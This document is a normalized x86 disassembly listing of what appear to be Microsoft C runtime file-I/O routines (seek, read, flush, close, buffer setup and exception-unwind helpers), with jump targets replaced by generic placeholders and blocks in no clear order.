jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10028b8d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10032f5b
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002aebb
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b6c0
mov eax [ ebp - 0x1c ]
sub_1002b6ca
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_10026ca5
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_1002b713
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_10026065
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1002b6ca
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_1002ae89
pop ecx
push eax
call sub_1002cb15
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_1002ae89
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_1002ae89
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_1002ae89
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1002ae89
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1002b83e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10032ee4
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_10026065
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_1002608b
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_1002b8b3
push 0x10
push r--data
call sub_10028b48
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10026078
and [ eax ] 0x0
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] edi
call sub_10026065
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10028b8d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10032f5b
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002b83e
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b985
mov eax [ ebp - 0x1c ]
sub_1002b98f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_1002ae89
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
push 0x1
push ebx
push eax
call sub_1002b8b3
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_1002b8b3
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_1002b8b3
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_1002bb2c
mov edi edi
push ebp
mov ebp esp
mov eax 0x1020
call sub_10027570
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1002ae89
mov ebx eax
xor eax eax
cmp [ esi + 0x4 ] eax
pop ecx
mov [ ebp - 0x1018 ] ebx
jge r-xdata
push 0x1
push eax
push eax
push ebx
call sub_10031997
add esp 0x10
mov edi eax
mov [ ebp - 0x1014 ] edi
mov [ ebp - 0x1010 ] edx
test edx edx
jg r-xdata
mov [ esi + 0x4 ] eax
mov eax ebx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
and ebx 0x1f
mov [ ebp - 0x101c ] eax
mov eax [ eax ]
shl ebx 0x6
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
test [ esi + 0xc ] 0x108
mov [ ebp - 0x1005 ] cl
jne r-xdata
jl r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov edi ecx
sub edi edx
mov edx [ esi + 0xc ]
mov [ ebp - 0x100c ] edi
test dl 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x1010 ]
cdq
sub edi eax
sbb ecx edx
mov eax edi
mov edx ecx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jae r-xdata
test dl dl
js r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
mov edx [ ebp - 0x1014 ]
or edx [ ebp - 0x1010 ]
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
xor edx edx
cmp [ eax + 0x30 ] edx
je r-xdata
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x100c ]
jmp r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
shr edi 0x1
mov [ ebp - 0x1020 ] edi
cmp [ esi + 0x4 ] edx
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
cmp edx ecx
jb r-xdata
push edx
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ ebp - 0x1018 ]
call sub_10031997
mov esi eax
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
add eax ebx
add esp 0x10
mov edi edx
cmp esi [ eax + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
jmp r-xdata
mov eax [ ebp - 0x100c ]
xor edx edx
add eax [ ebp - 0x1014 ]
adc edx [ ebp - 0x1010 ]
shr [ ebp - 0x100c ] 0x1
sub ecx [ esi + 0x8 ]
add ecx edx
test [ eax + 0x4 ] 0x80
mov edi ecx
je r-xdata
and [ ebp - 0x100c ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
cmp edi [ eax + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_10031997
add esp 0x10
cmp eax [ ebp - 0x1014 ]
jne r-xdata
inc edx
inc [ ebp - 0x100c ]
push 0x0
lea ecx [ ebp - 0x100c ]
push ecx
push 0x1000
lea ecx [ ebp - 0x1004 ]
push ecx
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x1014 ] edi
sbb [ ebp - 0x1010 ] 0x0
shr edi 0x1
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_10031997
add esp 0x10
test edx edx
jg r-xdata
cmp edx [ ebp - 0x1010 ]
jne r-xdata
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_10031997
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov ecx [ ebp - 0x100c ]
mov ebx [ ebp - 0x1020 ]
cmp ebx ecx
ja r-xdata
jl r-xdata
mov edi [ esi + 0x18 ]
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea eax [ ebp - 0x1004 ]
test ebx ebx
je r-xdata
test eax eax
jb r-xdata
inc edi
mov edi eax
test ecx 0x400
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ esi + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
sub eax ecx
xor edx edx
add eax esi
adc edx edi
jmp r-xdata
lea edx [ ebp + ecx - 0x1004 ]
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
test [ eax + ebx + 0x4 ] 0x4
inc eax
inc edi
je r-xdata
mov cl [ eax ]
cmp cl 0xd
jne r-xdata
movzx ecx cl
movsx ecx [ ecx + rw-data ]
add eax ecx
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
dec ebx
cmp eax edx
jae r-xdata
inc eax
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax ecx
jmp r-xdata
sub_1002be78
push 0x10
push r--data
call sub_10028b48
push [ ebp + 0x8 ]
call sub_100230d6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1002bb2c
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002beb8
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_10028b8d
retn
sub_1002bec2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
test al 0x83
je r-xdata
call sub_10026065
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_10022bd6
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_1002bb2c
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1002ae89
pop ecx
push eax
call sub_10031997
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_1002bf5e
push 0xc
push r--data
call sub_10028b48
push [ ebp + 0x8 ]
call sub_100230d6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002bec2
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bfa3
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
sub_1002bfad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_100207fd
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1002bfde
push 0x10
push r--data
call sub_10028b48
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026065
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10028b8d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10032f5b
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_10026065
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10032ee4
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c0b5
mov eax [ ebp - 0x1c ]
call sub_10026078
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_1002c0bf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10032ee4
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1002608b
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10032ee4
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10032ee4
push 0x1
mov edi eax
call sub_10032ee4
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10032e5e
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1002c15b
push 0x10
push r--data
call sub_10028b48
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10026078
and [ eax ] 0x0
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] edi
call sub_10026065
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10028b8d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10032f5b
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10026065
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1002c0bf
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c21e
mov eax [ ebp - 0x1c ]
sub_1002c228
push 0x10
push r--data
call sub_10028b48
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c2be
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_10022e33
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_100207fd
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_1002c2c7
push 0x10
push r--data
call sub_10028b48
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c3f6
mov eax edi
call sub_10028b8d
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_10026ca5
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_1002d8b2
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_100207fd
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10023117
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_10028e8b
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_10023185
pop ecx
pop ecx
sub_1002c400
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1002c490
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_100332d1
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_100332f0
jmp r-xdata
sub_1002c490
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10020040
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1002c400
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1002c4f2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1002c522
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1002c553
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_10026078
and [ eax ] 0x0
call sub_10026065
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_10026078
mov [ eax ] ebx
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_10026078
mov [ eax ] ebx
call sub_10026065
mov [ eax ] 0x9
jmp r-xdata
call sub_10026078
mov [ eax ] ebx
call sub_10026065
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_10026ca5
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_10031912
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_10026065
mov [ eax ] 0xc
call sub_10026078
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_1002608b
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
